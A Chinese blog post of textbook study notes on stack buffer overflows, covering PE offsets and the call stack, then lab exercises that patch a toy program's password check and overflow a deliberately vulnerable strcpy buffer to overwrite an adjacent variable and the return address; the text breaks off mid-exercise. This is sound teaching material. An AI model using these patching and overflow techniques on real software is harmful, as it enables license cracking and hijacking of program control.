<p>$.text节偏移&#x3D;0x 1000-0x400&#x3D;0xC00$</p>
<p>$.rdata节偏移&#x3D;0x7000-0x6200&#x3D;0xE00$</p>
<p>$.data节偏移&#x3D;0x9000-0x7400&#x3D;0x1C00$</p>
<p>$.rsrc节偏移&#x3D;0x2D000-0x7800&#x3D;0x25800$</p>
<p>$$文件偏移地址 &#x3D; 虚拟内存地址(VA) - 装载基址(Image Base) -节偏移 &#x3D; RVA - 节偏移$$</p>
<h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章 栈溢出原理与实践"></a>第二章 栈溢出原理与实践</h2><h3 id="2-1-系统栈的工作原理"><a href="#2-1-系统栈的工作原理" class="headerlink" title="2.1 系统栈的工作原理"></a>2.1 系统栈的工作原理</h3><div class="note primary"><p>简单说来，缓冲区溢出就是在大缓冲区中的数据向小缓冲区复制的过程中，由于没有注意小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了和小缓冲区相邻内存区域的其他数据而引起的内存问题。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。</p>
<p>成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码， 最终获得主机的控制权。</p>
</div>

<p>要透彻地理解这种攻击方式，需要回顾一些计算机体系架构方面的基础知识，搞清楚CPU、寄存器、内存是怎样协同工作而让程序流畅执行的。</p>
<p>根据不同的操作系统，一个进程可能被分配到不同的内存区域去执行。但是不管什么样的操作系统、什么样的计算机架构，进程使用的内存都可以按照功能大致分成以下 4 个部分。</p>
<div class="note info"><ul>
<li>代码区（text）：这个区域存储着被装入执行的进制机器代码，处理器会到这个区域取指并执行。</li>
<li>数据区（data）：用于存储全局变量等。</li>
<li>堆区（heap）：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。</li>
<li>栈区（stack）：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</li>
</ul>
</div>

<p>具体内容：<a href="https://directoree.top/post/memory-management/">C&#x2F;C++ 语言内存管理</a></p>
<mark class="label success">在 Windows 平台下，高级语言写出的程序经过编译链接，最终会变成 PE 文件。</mark><mark class="label danger">当PE文件被装载运行后，就成了所谓的进程。</mark>

<p><img data-src="https://i.loli.net/2021/04/26/FkUCpIm46aLsSW2.png" alt="4.png"></p>
<span id="zl">
<div class="note danger"><p><mark class="label default">PUSH</mark><mark class="label warning">POP</mark><mark class="label danger">CALL</mark><mark class="label success">RET</mark> </p>
<ul>
<li><mark class="label default">PUSH XXX</mark>：<code>XXX</code>可以是立即数也可以是寄存器，意思是将<code>XXX</code>入栈到栈顶。<ul>
<li><code>push XXX</code>等价于<code>sub esp,0x04</code>，<code>mov [esp],XXX</code>。</li>
<li>每进行一次 PUSH，<strong>TOP（栈顶）自动加 1</strong>，即 esp 自动减 4。</li>
</ul>
</li>
<li><mark class="label warning">POP EAX</mark>：将<strong>栈顶元素</strong>弹出到寄存器 eax 中。<ul>
<li>等价于<code>move eax,[esp]</code>，<code>add esp 0x4</code>。</li>
<li>每进行一次 PUSH，<strong>TOP（栈顶）自动减 1</strong>，即 esp 自动加 4。</li>
</ul>
</li>
<li><mark class="label danger">CALL XXX</mark>：<code>XXX</code>可以是立即数（地址）也可以是寄存器，意思是将跳转到<code>XXX</code>处继续执行。<ul>
<li>等价于<code>push 返回地址</code>，<code>move eip,XXX</code>，<code>jmp eip</code>。</li>
<li><code>CALL</code>指令会将返回地址压入栈中，然后修改 EIP 的值为<code>XXX</code>，最后跳转到<code>XXX</code>。</li>
</ul>
</li>
<li><mark class="label success">RET</mark>：函数返回。<ul>
<li>等价于<code>pop eip</code>，<code>jmp eip</code>。</li>
<li><code>ret</code>会将栈顶元素（返回地址）弹出到寄存器 EIP 中，然后去执行 EIP 中的指令。</li>
</ul>
</li>
</ul>
</div>
</span>


<p>根据操作系统的不同、编译器和编译选项的不同，同一文件不同函数的代码在内存代码区中的分布可能相邻，也可能相离甚远，可能先后有序，也可能无序；但它们都在同一个PE文件的代码所映射的一个“节”里。我们可以简单地把它们在内存代码区中的分布位置理解成是散乱无关的。</p>
<p><img data-src="https://i.loli.net/2021/04/26/6mfTMj7xpWhvNyd.png" alt="1-6.png"></p>
<h3 id="2-2-函数调用约定与函数返回"><a href="#2-2-函数调用约定与函数返回" class="headerlink" title="2.2 函数调用约定与函数返回"></a>2.2 函数调用约定与函数返回</h3><h4 id="2-2-1-函数调用约定"><a href="#2-2-1-函数调用约定" class="headerlink" title="2.2.1 函数调用约定"></a>2.2.1 函数调用约定</h4><p><img data-src="https://i.loli.net/2021/04/26/LRAP2JpMYoSEObV.png" alt="1-7.png"></p>
<p><img data-src="https://i.loli.net/2021/04/26/PFpUERnT7Shvyl9.jpg" alt="func_call_types.jpg"></p>
<div class="note danger"><p>每一个 C++ 类成员函数都有一个<mark class="label warning">this</mark>指针，在 Windows 平台中，这个指针一般是用<mark class="label danger">ECX</mark>寄存器来传递的，但使用 GCC 编译器编译，这个指针会作为最后一个参数压入栈中。</p>
</div>

<h4 id="2-2-2-函数返回"><a href="#2-2-2-函数返回" class="headerlink" title="2.2.2 函数返回"></a>2.2.2 函数返回</h4><p>函数返回时步骤如下：</p>
<div class="note default"><ol>
<li><strong>保存返回值</strong>：通常将函数的返回值保存在寄存器<mark class="label primary">EAX</mark>中。</li>
<li><strong>恢复栈帧</strong>：弹出当前栈帧，恢复上一个栈帧。具体包括：<ul>
<li>在堆栈平衡的基础上，给 ESP 加上栈帧的大小，抬高栈顶（地址变大），回收当前栈帧的空间。将当前栈帧底部保存的前栈帧 EBP 值弹入<mark class="label success">EBP</mark>寄存器，恢复出上一个栈帧。</li>
<li>将函数返回地址弹给<mark class="label warning">EIP</mark>寄存器。</li>
</ul>
</li>
<li><strong>跳转</strong>：按照函数返回地址跳回母函数（调用函数）中继续执行。</li>
</ol>
</div>

<p>以 C 语言和 Win32 平台为例，函数返回时的相关的指令序列如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add esp,XXX   ;降低栈顶，回收当前的栈帧。此时栈顶元素是被保存的旧ebp的值，esp指向栈顶的旧ebp的值</span><br><span class="line">pop ebp		;将上一个栈帧底部位置恢复到ebp，pop指令弹出的是栈顶元素！！弹出栈顶元素到寄存器ebp，</span><br><span class="line">  		;此时该栈被清空。esp指向返回地址。</span><br><span class="line">retn		;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。至此，栈帧恢复工作完成。</span><br><span class="line">  		;b）让处理器跳转到弹出的返回地址，恢复调用前的代码区。</span><br></pre></td></tr></table></figure>

<p>函数调用与函数返回的的过程图如下。</p>
<p><img data-src="https://i.loli.net/2021/04/26/3stdAIYeh4cQLli.png" alt="1-8.png"></p>
<h3 id="2-3-爆破（修改跳转逻辑）"><a href="#2-3-爆破（修改跳转逻辑）" class="headerlink" title="2.3 爆破（修改跳转逻辑）"></a>2.3 爆破（修改跳转逻辑）</h3><p>程序源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please inpute password:    &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;congratulations!! You have passed the varification!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<div class="note danger"><p><strong>源代码分析</strong>：分析<code>main</code>函数，有两个判断分支，只有当输入的<code>password</code>等于<code>1234567</code>时密码正确才能通过验证，跳出循环。</p>
<p><strong>破解思路</strong>：修改跳转逻辑，即使输入错误的密码，也将通过验证。</p>
<p><strong>使用工具</strong>：IDA Pro、OllyDbg、LordPE、UltraEdit。</p>
</div>

<ol>
<li>将编译过后的<code>.exe</code>文件拖入到 IDA 中，先根据函数流程图判断分支，然后定位到发生跳转的点（即爆破点）；</li>
<li>可以看到这条指令定位在<code>.text</code>节，并且 IDA 已经自动将该条指令的地址换算成了运行时的内存地址 VA：<code>0x0040106E</code>。接着使用 OllyDbg 打开该 PE 文件，并搜素（Ctrl+G）地址<code>0x0040106E</code>定位到该指令。</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/vyCcsSl5Tm8fwHp.png" alt="1-9.png"><br><img data-src="https://i.loli.net/2021/04/26/NOmYSBVEWlK5bHj.png" alt="1-10.png"><br><img data-src="https://i.loli.net/2021/04/26/wcJzmiWSb9EZ4lL.png" alt="1-11.png"></p>
<div class="note info"><p>OllyDbg 在默认情况下将程序中断在 PE <strong>装载器开始处</strong>，而不是<code>main</code>函数的开始。可以按 F8 键单步跟踪，看看在<code>main</code>函数被运行之前，装载器都做了哪些准备工作。一般情况下， <code>main</code>函数位于<code>GetCommandL ineA</code>函数调用后不远处，并且有明显的特征：<mark class="label success">mian函数在调用之前有3次连续的压栈操作，因为系统要给main传入默认的argc、argv等参数</mark>。找到main函数调用后，按F7键单步跟入就可以看到真正的代码了。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/gMxnQvjiTzDNVk7.png" alt="1-12.png"></p>
<ol start="3">
<li>选中这条指令，按<code>F2</code>键下断点，成功后，指令的地址会被标记成不同颜色。</li>
<li>按<code>F9</code>键让程序运行起来，这时候控制权会回到程序，OllyDbg 暂时挂起。到程序提示输入密码的 Console界面随便输入一个错误的密码，回车确认后，OllyDbg会重新中断程序，收回控制权。</li>
<li>分析<code>0x0040106C</code>和<code>0x0040106E</code>处的代码：<code>TEST EAX,EAX</code>，<code>JE XXXXXXXX</code>。也就是说，EAX 中的值为 0 时，跳转将被执行，程序进入密码确认流程；否则跳转不执行，程序进入密码重输的流程。</li>
<li>两种破解修改方法：<ul>
<li><mark class="label warning">把 JE 这条指令的机器代码修改成 JNE（非 0 则跳转）</mark>，那么整个程序的逻辑就会反过来：输入错误的密码会被确认，输入正确的密码反而要求重新输入!（双击JE这条指令，将其修改成 JNE，单击“Assemble"按钮将其写入内存如图 1.4.9 所示）OllyDbg 将汇编指令翻译成机器代码后写入内存。原来内存中的机器代码74 （JE）现在变 成了75 （JNE）。 </li>
<li><mark class="label default">把 TEST EAX ,EAX 指令修改成 XOR EAX,EAX</mark> 也能达到改变程序流程的目的，这时不论正确与否，密码都将被接受。</li>
</ul>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/faDQn8hysBVUwdN.png" alt="1（开始）.png"></p>
<ol start="7">
<li><p>将 PE 文件<mark class="label danger">硬编码</mark>。上面动态调试只是在内存中修改程序数据，当程序再一次打开的时候内存丢失则不会继续执行上述结果，所以还需要在二进制文件中也修改相应的字节。</p>
<ul>
<li><p>上面得到的是内存虚拟地址（VA）为<code>0x0040106E</code>，使用<mark class="label info">LordPE</mark> 打开<code>.exe    </code>文件，如图 1.4.10。按照 VA 与文件地址的换算公式：</p>
<p>$文件偏移地址 &#x3D; 虚拟内存地址(VA) - 装载基址(Image Base) - 节偏移$</p>
<p>$ &#x3D; 0x0040106E - 0x00400000 - (0x00001000 - 0x00001000) &#x3D; 0x106E$</p>
</li>
</ul>
</li>
<li><p>也就是说，这条指令在 PE 文件中位于距离文件开始处<code>106E</code> 字节的地方。用<mark class="label info">UltraEdit</mark> 按照二进制方式打开该<code>.exe </code>文件，如图1.4.11 所示。按快捷键 Ctrl+G，输入<code>0x106E</code>直接跳到 JE 指令的机器代码处，如图1.4.12所示。将这一个字节的 74 (JE) 修改成 75 (JNE)，保存后重新运行可执行文件，原本正确的密码<code>1234567</code>现在反而提示错误了。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/o1AqzlrJ9Mxp2s8.png" alt="2.png"><br><img data-src="https://i.loli.net/2021/04/26/dSbPayni8DeFmNH.png" alt="3.png"></p>
<h3 id="2-4-修改领接变量（返回值）"><a href="#2-4-修改领接变量（返回值）" class="headerlink" title="2.4 修改领接变量（返回值）"></a>2.4 修改领接变量（返回值）</h3><p>函数的局部变量在栈中一个挨着一个排列，如果这些局部变量中有数组之类的缓冲区，并且程序中存在数组越界的缺陷，那么越界的数组元素就有可能<strong>破坏栈中相邻变量的值</strong>，甚至破坏栈帧中所保存的 <strong>EBP</strong> 值、<strong>返回地址</strong>等重要数据。</p>
<div class="note success"><p>大多数情况下，局部变量在栈中的分布是相邻的，但也有可能出于编译优化等需要而有所例外。</p>
</div>

<p>程序源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];<span class="comment">//add local buffer to be overflowed</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please inpute password:    &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;congratulations!! You have passed the varification!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<div class="note danger"><p><strong>源码分析</strong>：<code>verify_password</code>函数中的<code>strcpy(buffer,password)</code>直接将<code>password</code>复制给了<code>buffer</code>，没有经过过滤处理，且<code>buffer</code>在内存的栈中，故可以操作内存修改栈中数据。</p>
<p><strong>破解思路</strong>：修改栈数据，使得返回值<code>authenticated</code>等于 0，绕过验证。</p>
</div>

<blockquote>
<p>相对 Crack 实验的修改</p>
<ul>
<li>verify_ password 函数中的局部变量 char buffer[8] 的声明位置。</li>
<li>字符串比较之后的 strcpy(buffer,password)。</li>
</ul>
<p>这两处修改实际上对程序的密码验证功能并没有额外作用，这里加上它们只是为了人为制造一个栈溢出漏洞。</p>
</blockquote>
<div class="note success"><p><mark class="label primary">如果我们输入的密码超过了7个字符（注意：字符串截断符NULL将占用一个字节），则越界字符的ASCII码会修改掉authenticated的值。</mark><mark class="label danger">如果这段溢出数据恰好把authenticated改为 0，则程序流程将被改变。</mark></p>
</div>

<p>图 2.2.1 是<code>verify_ password</code>函数运行时的函数栈。</p>
<p>（1）可以看到，在<code>verify_ password</code>函数的栈帧中，局部变量<code>int authenticated</code>恰好位于缓冲区<code>char buffer[8]</code>的“下方”。</p>
<p>（2）<code>authenticated</code>为<code>int</code>类型，在内存中是一个 DWORD，占 4 个字节。所以，如果能够让<code>buffer</code>数组越界，<code>buffer[8]</code>、<code> buffer[9]</code>、<code>buffer[10]</code>、<code>buffer[11]</code>将写入相邻的变量<code>authenticated</code>中。</p>
<p>（3）观察一下源代码不难发现，<code>authenticated</code>变量的值来源于<code>strcmp</code>函数的返回值，之后会返回给<code>main</code>函数作为密码验证成功与否的标志变量：当<code>authenticated</code>为 0 时，表示验证成功；反之，验证不成功。</p>
<p><img data-src="https://i.loli.net/2021/04/26/BHf7rFqxaKNb1AT.png" alt="8.png"></p>
<ol>
<li>假如输入的密码为7个英文字母<code>q</code>，按照字符串的序关系<code>qqqqqq&gt;1234567</code>， strcmp 应该返回 1，即authenticated 为 1。OllyDbg 动态调试的实际内存情况如图 2.2.3 所示，栈帧分布情况如表2-2-2。</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/ZTybn8UFNlBdX5H.png" alt="9.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/dYMc4Uhrs6IR8Wu.png" alt="10.png"></p>
<div class="note default"><span id="sj">
<mark class="label danger">内存数据</mark><mark class="label info">数值数据</mark><mark class="label default">小端序</mark>

<p>在观察内存的时候应当注意<mark class="label danger">内存数据</mark> 与 <mark class="label info">数值数据</mark> 的区别。在我们的调试环境中，内存由低到高分布，Win32 系统在内存中由低位向高位存储一个 4 字节的双字（DWORD），但在作为“数值”应用的时候，却是按照由高位字节向低位字节进行解释。这样一来，在我们的调试环境中，“内存数据”中的 DWORD 和我们逻辑上使用的“数值数据”是<mark class="label default">按每个字节（8位）序逆序</mark>过的。</p>
<p>例如，变量 authenticated 在内存中存储为<code>0x01 00 10 00</code>，这个“内存数据”的双字会被计算机由高位向低位按字节解释成“数值数据”<code>0x00 10 00 01</code>。出于便于阅读的目的，OllyDbg 在栈区显示的时候已经将内存中双字的字节序反转了，也就是说，<strong>栈区栏显示的是“数值数据”，而不是原始的“内存数据”</strong>（ <mark class="label warning">栈区栏按照数值数据显示</mark> ），所以，在栈内看数据时，从左向右读数据时对于 32 位系统地址的偏移量依次为0、 1、2、3。</p>
<p>小端序：<mark class="label danger">数值数据的高字节存放于内存数据的低字节</mark>，如<code>00rst  </code>--&gt; （对应ASCII码）<code>00 72 73 74</code>--&gt;（存于内存中时）<code>74 73 72 00</code>。其实就是一个入栈原理，如数值数据<code>00 72 73 74</code>，<code>74</code>数值低位先入栈，相应的也就存于栈的高地址，<code>73</code>位于栈的次高地址，所以在内存中也就变成了<code>74 73 72 00</code>。</p>
</div>
</span>

<p>【<a href="https://directoree.top/post/cssapp_notes/#duanxu">大端序小端序</a>】</p>
<ol start="2">
<li><p>下面试试输入超过 7 个字符，看看超过<code>buffer[8]</code>边界的数据能不能写进<code>authenticated</code>变量的数据区。为了便于区分溢出的数据，这次我们输入的密码为<code>qqqqqqqqrst</code>（8个q，‘q’、’r’、 ‘s’、‘t’ 的ASCII码相差1），结果如图 2.2.4 所示。</p>
<p>栈中的情况和我们分析的一样，从输入的第 9 个字符开始，将依次写入<code>authenticated</code>变量。 按照我们的输入<code>qqqqqqqqrst</code>，最终<code>authenticated</code>的值应该是字符<code>r</code>、 <code>s</code>、<code>t</code>和用于截断字符串的<code>null</code>所对应的 ASCII 码<code>0x00747372</code>。这时的栈帧数据如表 2-2-3 所示。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/Rv84mWQh6LgErsB.png" alt="11.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/kRziayTYu2ASvFU.png" alt="屏幕快照 2021-02-01 下午6.22.08.png"></p>
<ol start="3">
<li>如下图</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/HtGmEO5ZWAahxTP.png" alt="屏幕快照 2021-02-01 下午6.24.23.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/osg3aCjOVD6TASu.png" alt="屏幕快照 2021-02-01 下午6.27.56.png"></p>
<div class="note danger"><p><strong>严格说来，并不是任何 8 个字符的字符串都能冲破上述验证程序</strong>。</p>
<p>由代码中的<code>authenticated=strcmp(password,PASSWORD)</code>， 我们知道 authenticated 的值来源于字符串比较函数 strcmp 的返回值。按照字符串的序关系，当输入的字符串大于<code>1234567</code>时返回 1，这时 authenticated 在内存中的值为<code>0x00000001</code>，可以用字串的截断符 NULL 淹没 authenticated 的低位字节而突破验证；当输入字符串小于<code>1234567</code>时（例如，“0123” 等字符串），函数返回<code>-1</code>，这时 authenticated 在内存中的值按照双字<code>-1</code>的补码存放，为<code>0xFFFFFFF</code>，如果这时也输入 8 个字符的字符串，截断符淹没 authenticated 低字节后，其值变为<code>0xFFFFFF00</code>，所以这时是不能冲破验证程序的。</p>
</div>



<h3 id="2-5-修改函数返回地址"><a href="#2-5-修改函数返回地址" class="headerlink" title="2.5 修改函数返回地址"></a>2.5 修改函数返回地址</h3><p>上节实验改写邻接变量的方法是很有用的，但这种漏洞利用对代码环境的要求相对比较苛刻。更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 <mark class="label default">EBP</mark> 和  <mark class="label warning">函数返回地址</mark>等栈帧状态值。</p>
<p>回顾上节实验中输入7个<code>q</code>程序正常运行时的栈状态，如表2-3-1 所示。</p>
<p><img data-src="https://i.loli.net/2021/02/02/kuF4xLgPpJWilGy.png" alt="屏幕快照 2021-02-02 下午6.25.04.png"></p>
<div class="note info"><p>如果继续增加输入的字符，那么超出<code>buffer[8]</code>边界的字符将依次淹没<code>authenticated</code>、 前栈帧EBP、返回地址。也就是说，控制好字符串的长度就可以让字符串中相应位置字符的 ASCII 码覆盖掉这些栈帧状态值。</p>
</div>

<ol>
<li><p>输入19个<code>q</code>，第 9~12 个字符将 authenticated 冲刷为<code>0x71717171</code>；第 13~16 个字将前栈帧 EBP 冲刷为<code>0x71717171</code>；第 17~19 个字符连同 NULL 结束符将返回地址冲刷为<code>0x00717171</code>。</p>
<p>这里用 19 个字符作为输入，看看淹没返回地址会对程序产生什么影响。出于双字对齐的目的，我们输入的字符串按照<code>4321</code>为一个单元进行组织，最后输入的字符串为<code>4321432143214321432</code>，Ollydbg 运行状态如图2.3.2，栈的情况如表2-3-1所示。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/02/YmFIlPAjuh2Wef4.png" alt="屏幕快照 2021-02-02 下午6.57.31.png"></p>
<p><img data-src="https://i.loli.net/2021/02/02/jqLI5Wsz4Q7eKJc.png" alt="17.png"></p>
<ol start="2">
<li><p>返回地址被字符 ASCII 码覆盖成了<code>0x00323334</code>，函数返回时的状态如图2.3.4所示。</p>
<p>我们可以从调试器中的显示看出计算机中发生的事件：</p>
<ol>
<li>函数返回时将返回地址装入EIP寄存器。</li>
<li>处理器按照EIP寄存器的地址<code>0x00323334</code>取指。</li>
<li>内存<code>0x00323334</code>处并没有合法的指令，处理器不知道该如何处理，报错。</li>
</ol>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/02/l4OkxICNd3ozUnL.png" alt="18.png"></p>
<div class="note warning"><p>由于<code>0x00323334</code>是一个无效的指令地址，所以处理器在取指的时候发生了错误使程序崩溃。但如果这里我们给出一个有效的指令地址，就可以让处理器跳转到任意指令区去执行（比如直接跳转到程序验证通过的部分），也就是说，我们可以 <mark class="label danger">通过淹没返回地址而控制程序的执行流程</mark> 。</p>
</div>

<h3 id="2-6-控制程序执行流程（修改返回地址）"><a href="#2-6-控制程序执行流程（修改返回地址）" class="headerlink" title="2.6 控制程序执行流程（修改返回地址）"></a>2.6 控制程序执行流程（修改返回地址）</h3><div class="note info"><p>用键盘输入字符的 ASCII 表示范围有限，很多值（如0x11、0x12等符号）无法直接用键盘输入，所以把实验的代码做了下改动，将程序的<strong>输入改由PE文件同目录下从文件读取出字符串</strong>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!!!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))        <span class="comment">//判断文件是否存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);        <span class="comment">//不存在则直接exit出程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);        <span class="comment">//从password.txt读取字符串，参数为文件指针，读取类型等..</span></span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verifycation!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<div class="note primary"><p>准备工作：</p>
<p>（1）要摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。</p>
<p>（2）要得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。</p>
<p>（3）要在<code>password.txt</code>文件的相应偏移处填上这个地址。</p>
<p>（4）<code>verify_password</code>函数返回后就会直接跳转到验证通过的正确分支去执行了。</p>
</div>

<ol>
<li><p>首先用 OllyDbg 加载得到可执行 PE 文件，如图2.3.5所示。</p>
<p><img data-src="https://i.loli.net/2021/02/03/YXHu37AVfhpd1m2.png" alt="19.png"></p>
</li>
<li><p>阅读图 2.3.5 中显示的反汇编代码，返回地址为<code>0x00401107</code>，在<code>0x0040110A</code>处将EAX中的函数返回值取出，在<code>0x0040110D</code>处与 0 比较，然后决定跳转到提示验证错误的分支或提示验证通过的分支。可以知道通过验证的程序分支的指令地址为<code>0x00401122</code>，如果把返回地址修改为<code>0x00401122</code>，则可以绕过程序验证，如图2.3.6。</p>
<p><img data-src="https://i.loli.net/2021/02/03/lmOjRX7MZAJNhoi.png" alt="20.png"></p>
</li>
<li><p>仍然出于字节对齐、容易辨认的目的，仍然将“4321”作为一个输入单元。<code>buffer[8]</code>共需要两个这样的单元。</p>
<ul>
<li>第3个输入单元将authenticated覆盖；</li>
<li>第4个输入单元将前栈帧EBP值覆盖；</li>
<li>第5个输入单元将返回地址覆盖。</li>
</ul>
<p>为了把第5个输入单元的 ASCII 码值<code>0x34333231</code>修改成验证通过分支的指令地址<code>0x00401122</code>，我们将借助十六进制编辑工具 UItraEdit 来完成(0x40、 0x11 等ASCII码对应的符号很难用键盘输入）。</p>
<ol>
<li><p>创建一个名为<code>password.txt</code>的文件，并用记事本打开，在其中写入5个“4321”后保存到与实验程序同名的目录下。</p>
</li>
<li><p>保存后用 UItraEdit 打开，将 UItraEdit 切换到十六进制。</p>
<p><img data-src="https://i.loli.net/2021/02/03/TgcZEVLkyzFSsGt.png" alt="21.png"></p>
